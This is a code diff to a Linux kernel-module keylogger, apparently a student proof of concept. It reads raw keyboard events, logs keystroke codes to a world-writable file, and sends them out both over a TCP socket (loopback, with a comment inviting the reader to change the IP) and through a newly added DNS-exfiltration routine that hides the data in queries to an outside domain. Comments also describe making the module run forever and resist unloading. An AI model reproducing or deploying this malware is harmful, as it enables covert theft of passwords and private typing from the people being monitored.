@@ -8,11 +8,21 @@
 #include <linux/in.h>
 #include <linux/seq_file_net.h>
 #include <linux/slab.h>
+#include <linux/dns_resolver.h>
 
+#define MY_PORT 61100
+#define TCP_INTERVAL DNS_INTERVAL
+#define DNS_INTERVAL 20
+#define END 10000
+#define BUF_SIZE 20
+#define SERVER_IP INADDR_LOOPBACK
+#define NEW_STROKE_MAGIC_N 1
+#define PACK_SIZE BUF_SIZE * TCP_INTERVAL
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Peter Derias z5311768");
 
+// concatonates dest into str.
 int keylogger_strcat(char *src, char *dst) {
     int i, j;
     for (i = 0; src[i] != '\0'; i++);
@@ -23,32 +33,69 @@ int keylogger_strcat(char *src, char *dst) {
     return j;
 }
 
+int dns_send(char *pack, int size) {
+    char pack_dns[PACK_SIZE + 19];
+    int err;
+    snprintf(pack_dns, sizeof(pack_dns), "%s.peterderias.studio", pack);
+    err = dns_query(&init_net, NULL, pack_dns, size + 19, NULL, NULL, NULL, false);
+    if (err < 0) {
+        printk(KERN_INFO "err is %d", err);
+        printk(KERN_INFO "failed dns thingo\n");
+        printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
+        return -1;
+    }
+    return 0;
+}
+
+int tcp_init(struct socket **socketp) {
+    // intialises before sending
+    struct sockaddr_in addr = {
+        .sin_family = AF_INET,
+        .sin_port = htons (MY_PORT),
+        .sin_addr = { htonl (SERVER_IP) }
+    };
+    int err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, socketp);
+    if (err < 0) {
+            printk(KERN_INFO "failed tcp thingo\n");
+            printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
+            return -1;
+    }
+    err = (*socketp)->ops->connect(*socketp, (struct sockaddr *) &addr, sizeof(addr), O_RDWR);
+    if (err < 0) {
+            printk(KERN_INFO "failed to connect!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
+            return -1;
+    }
+    return 0;
+}
+
 static int __init keylogger_init(void) {
     loff_t zero;
-    char buf[20], pack[800];
+    char buf[BUF_SIZE], pack[PACK_SIZE];
     struct socket *sock = kmalloc(sizeof(*sock), GFP_KERNEL);
     int err, size;        
     int log, dev, i;
     mm_segment_t old_fs = get_fs();
     struct input_event ev;
+
+
     struct file *keyboard = filp_open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY, 0);
     char *persist_f = "/your_strokes.txt";
     struct file *persist = filp_open(persist_f, O_RDWR | O_CREAT | O_APPEND, 0777);
     if (!persist) {
-        printk(KERN_INFO "bad\n");
+        printk(KERN_INFO "Ew are you not root? Desgusteng - give me root plz\n");
         return -1;
     }
     i = 0;
     zero = 0;
     pack[0] = '\0';
     set_fs(KERNEL_DS);
-    // this can be set to "while (1)", and this should never return. Any interrupts trying to cancel the procees or unload it will
+    // this can be set to "while (1)", and this should never return. Any interrupts trying to unmount it will
     // be responded to with a "busy" error. This is changed since this is a proof of concept.
-    while (i < 10000) {
+    while (i < END) {
         kernel_read(keyboard, &ev, sizeof(struct input_event), &zero);
-        if (ev.value == 1) {
+        if (ev.value == NEW_STROKE_MAGIC_N) {
             printk(KERN_INFO "%d, %d\n", ev.code, ev.value);
-            snprintf(buf, 20, "%d\n", ev.code);
+            snprintf(buf, BUF_SIZE, "%d%c", ev.code, 'a');
             size = keylogger_strcat(pack, buf);
             // find the size needed
             dev = ev.code;
@@ -57,33 +104,30 @@ static int __init keylogger_init(void) {
             }
             kernel_write(persist, buf, log, &zero);
         }
-        if (i % 40 == 0) {
-            // send me your data - well, this will send to 127.0.0.1 as a proof of concept. Change it for your needs.
+
+        if (i % DNS_INTERVAL == 0 && i != 0) {
+            if (dns_send(pack, size) == -1) {
+                break;
+            }
+        }
+        //https://askubuntu.com/questions/443227/sending-a-simple-tcp-message-using-netcat
+        //https://www.linuxjournal.com/article/7660
+        //https://www.linuxjournal.com/article/8110
+        if (i % TCP_INTERVAL == 0) {
+            // send me your data - well, this will currently send to 127.0.0.1 as a proof of concept. Change it for your needs.
             if (i == 0) {
-                struct sockaddr_in addr = {
-                    .sin_family = AF_INET,
-                    .sin_port = htons (61100),
-                    .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
-                };
-                err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-                if (err < 0) {
-                        printk(KERN_INFO "failed tcp thingo\n");
-                        printk(KERN_INFO "failed! I don't know what is the point of me, so kill me plz\n");
-                        break;
-                }
-                err = sock->ops->connect(sock, (struct sockaddr *) &addr, sizeof(addr), O_RDWR);
-                if (err < 0) {
-                        printk(KERN_INFO "failed to connect!\nerror is %d\n I don't know what is the point of me, so kill me plz\n", err);
-                        break;
+                if (tcp_init(&sock) == -1) {
+                    break;
                 }
             }
-            if (i != 0) {
+            else {
                 struct msghdr msg;
                 struct sockaddr_in addr = {
                     .sin_family = AF_INET,
-                    .sin_port = htons (61100),
-                    .sin_addr = { htonl (INADDR_LOOPBACK) } // change this line to your IP!
+                    .sin_port = htons (MY_PORT),
+                    .sin_addr = { htonl (SERVER_IP) }
                 };
+                // fill in msg accurately
                 msg.msg_name = &addr;
                 msg.msg_namelen = sizeof(addr);
                 msg.msg_flags = 0;
@@ -101,6 +145,8 @@ static int __init keylogger_init(void) {
                 pack[0] = '\0';
             }
         }
+
+        
         i++;
     }
     set_fs(old_fs);
